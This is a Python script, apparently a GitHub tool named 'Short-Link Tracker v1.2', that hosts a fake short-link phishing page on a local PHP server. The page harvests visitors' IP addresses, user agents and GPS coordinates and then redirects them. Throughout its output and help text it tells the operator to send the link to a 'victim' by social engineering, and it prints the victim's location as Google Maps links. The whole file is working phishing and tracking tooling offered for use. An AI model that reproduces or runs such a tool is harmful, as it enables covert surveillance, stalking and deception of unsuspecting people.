import time
import argparse
import subprocess as subp
import os
import sys

url = ""
tracking = False
harvester = False

def echo(self):
    tc = {"d":"0","m":"31","h":"32","c":"36","B":"34","y":"33","p":"35"}
    for i in tc:
        self = self.replace("\%s" %i, "\033[1;%s;48m" %tc[i])
    self = self.replace("\cl", "\033[1;0;0m")
    print(self)

def configuring():
    echo("\h[+]\d Configuring Script..")
    fcontent = open("./template/simpleShortlink/js/button_redirect.js", "r").read()
    freplace = fcontent.replace("http://www.example.com/", url)
    f = open("./template/simpleShortlink/js/button_redirect.js", "w")
    f.write(freplace)
    f.close()
    time.sleep(2)
    enable_server()

def enable_server():
    with open("./tmp/server.txt", "w") as tmp:
        echo("\c[*]\d Starting Localhost WebServer...")
        subp.Popen(["php","-S","127.0.0.1:80", "-t", "template/simpleShortlink"], stdout=tmp, stderr=tmp, stdin=subp.PIPE)
        time.sleep(2)
        cont = input("\033[1;33;48m[?]\033[1;0;0m Please say to continue [y/n] ")
        if cont=="y":
            echo("\h[+] Server Running On http://127.0.0.1:8080\d")
            echo("\B * You should send the link to your victim!")
            echo("\B * And the victim must open it!")
            echo("\B * Do with social engineering!")
            echo("\B * Press ctrl+c to stop tracking.\d")
            echo("\d-------------------------------------------\d")
            time.sleep(3)
            victim_wait()
        else:
            echo("\m[-]\d Restoring Configuration..")
            fcontent = open("./template/simpleShortlink/js/button_redirect.js", "r").read()
            f = open("./template/simpleShortlink/js/button_redirect.js", "w")
            freplace = fcontent.replace(url, "http://www.example.com/")
            f.write(freplace)
            f.close()
            echo("\m[-]\d Clearing temporary..")
            for r, d, f in os.walk("./tmp"):
                for file in f:
                    os.remove(os.path.join(r, file))
            echo("\m[!] Exit!\d")

def geolocate():
    try:
        latlong = open("./tmp/latlong.txt", "r").readlines()
        lat = latlong[0].strip()
        long = latlong[1].strip()
        acc = float(latlong[2].strip()) / 3
        echo("\h[+] GEOPOSITION LOCATED!! :\d")
        echo("\h - Latitude  : {} deg".format(lat))
        echo("\h - Longitude : {} deg".format(long))
        echo("\h - Accuracy  : {}.00m".format(int(acc)))
        echo("\h - Google Maps : https://maps.google.com/?q={},{}\n".format(lat,long))
        if os.path.exists("./tmp/latlong.txt") == True:
            os.remove("./tmp/latlong.txt")
        echo("\c[*] Listening for victim...\d\n")
    except KeyboardInterrupt:
        echo("\n\m[*]\d Stopping Localhost Server...")
        os.popen("killall -9 php")
        echo("\m[-]\d Restoring Configuration..")
        fcontent = open("./template/simpleShortlink/js/button_redirect.js", "r").read()
        f = open("./template/simpleShortlink/js/button_redirect.js", "w")
        freplace = fcontent.replace(url, "http://www.example.com/")
        f.write(freplace)
        f.close()
        echo("\m[-]\d Clearing temporary..")
        for r, d, f in os.walk("./tmp"):
            for file in f:
                os.remove(os.path.join(r, file))
        echo("\m[!]\d Exit!")
        sys.exit()


def retrieve_info():
    try:
        UserInfo = open("./tmp/userInfo.txt", "r").readlines()
        ip = UserInfo[0].strip()
        ua = UserInfo[1].strip()
        echo("\h[+] Victim Opened!! :")
        echo("\h - IP          :\d {}".format(ip))
        echo("\h - USER-AGENT  :\d {}\n".format(ua))
        echo("\cListening for victim...\d\n")
        if os.path.exists("./tmp/userInfo.txt") == True:
            os.remove("./tmp/userInfo.txt")
    except KeyboardInterrupt:
        echo("\n\m[*]\d Stopping Localhost Server...")
        os.popen("killall -9 php")
        echo("\m[-]\d Restoring Configuration..")
        fcontent = open("./template/simpleShortlink/js/button_redirect.js", "r").read()
        f = open("./template/simpleShortlink/js/button_redirect.js", "w")
        freplace = fcontent.replace(url, "http://www.example.com/")
        f.write(freplace)
        f.close()
        echo("\m[-]\d Clearing temporary..")
        for r, d, f in os.walk("./tmp"):
            for file in f:
                os.remove(os.path.join(r, file))
        echo("\m[!]\d Exit!")
        sys.exit()

def victim_wait():
    try:
        always0 = False
        always1 = False
        while True:
            uI = os.path.exists("./tmp/userInfo.txt")
            lL = os.path.exists("./tmp/latlong.txt")
            if harvester == True:
                if uI == False and always0 == False:
                    echo("\c[*] Listening for victim...\d\n")
                    always0 = True
                if uI == True:
                    retrieve_info()
            else:
                pass
            if tracking == True:
                if lL == False and always1 == False:
                    always1 = True
                if lL == True:
                    geolocate()
            else:
                pass
            time.sleep(1)
    except KeyboardInterrupt:
        echo("\n\m[*]\d Stopping Localhost Server...")
        os.popen("killall -9 php")
        echo("\m[-]\d Restoring Configuration..")
        fcontent = open("./template/simpleShortlink/js/button_redirect.js", "r").read()
        f = open("./template/simpleShortlink/js/button_redirect.js", "w")
        freplace = fcontent.replace(url, "http://www.example.com/")
        f.write(freplace)
        f.close()
        echo("\m[-]\d Clearing temporary..")
        for r, d, f in os.walk("./tmp"):
            for file in f:
                os.remove(os.path.join(r, file))
        echo("\m[!]\d Exit!")
        sys.exit()


def usage():
    echo(""" 
         \h_\d   \y_ ____\d    \m_\d          \y_ _____\d      \m_\d
  \h_____ | |\d          \m_| |_   ____  ____  ____ | | __\d 
 \h|  ___|| |\d      \y__\d \m|_   _| |  __||___ ||  __|| |/ /\d
 \h|___  || |___\d  \y|__|\d  \m| |__ | |   |  _ || |__ |  _ \ \d 
 \h|_____||_____|\d       \m|____||_|   |____||____||_| \_\ \d 
    \y__ ______\d          \cShort-Link Tracker v1.2(stable)\d
    
   \h[\d \yDevice Info Harvester And Geolocation Tracking\d \h]\d
            
\h-------------------------------------------------------\d
\h[+] Developer  : XZEN\y@\d\mZEXCEED12300\d
\h[+] Contact me : \chttps://www.facebook.com/profile.php?id=100011531026694\d
\h[+] Github     : \chttps://github.com/zexceed12300\d
\h[+] Version    : 1.2 (stable)\d
\h-------------------------------------------------------\d
     """)


usage()

def get_parameters():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--redirect", metavar="[URL]", help="after click the continue button and waiting for 10 second in phising page, victim redirect to ?? (ex: https://google.com)")
    parser.add_argument("-T", "--tracking", metavar="[enable/disable]", help="enable/disable geolocation tracking. (default: disable)", default="disable")
    parser.add_argument("-H", "--harvester", metavar="[enable/disable]", help="enable/disable device information harvester. (default: enable)", default="enable")
    args = parser.parse_args()
    if args.tracking:
        global tracking
        if str(args.tracking) == "enable":
            tracking = True
        if str(args.tracking) == "disable":
            tracking = False
    if args.harvester:
        global harvester
        if str(args.harvester) == "enable":
            harvester = True
        if str(args.harvester) == "disable":
            harvester = False

    directurl = args.redirect
    global url
    try:
        if "://" not in directurl:
            url = "http://"+directurl
        else:
            url = directurl
    except TypeError:
        echo("sl-track: redirect argument is wrong/not found!")
    if args.redirect:
        configuring()
    else:
        parser.print_help()
get_parameters()
